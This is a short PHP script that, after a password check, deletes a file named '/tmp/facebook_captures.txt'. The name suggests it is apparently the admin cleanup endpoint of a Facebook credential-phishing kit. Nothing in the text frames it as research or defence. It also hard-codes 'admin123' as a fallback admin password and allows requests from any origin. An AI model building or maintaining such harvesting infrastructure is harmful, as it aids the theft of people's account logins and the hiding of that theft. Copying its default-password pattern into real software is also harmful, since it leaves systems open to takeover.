<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

$admin_pass = getenv('ADMIN_PASS') ?: 'admin123';

$auth = false;
if (isset($_POST['password']) && hash_equals($admin_pass, $_POST['password'])) {
    $auth = true;
}
// Also accept JSON
$raw = file_get_contents('php://input');
$json = json_decode($raw, true);
if (isset($json['password']) && hash_equals($admin_pass, $json['password'])) {
    $auth = true;
}

if (!$auth) {
    http_response_code(401);
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}

$txt_file = '/tmp/facebook_captures.txt';
if (file_exists($txt_file)) {
    unlink($txt_file);
    echo json_encode(['status' => 'ok', 'message' => 'Cleared']);
} else {
    echo json_encode(['status' => 'ok', 'message' => 'Nothing to clear']);
}
?>
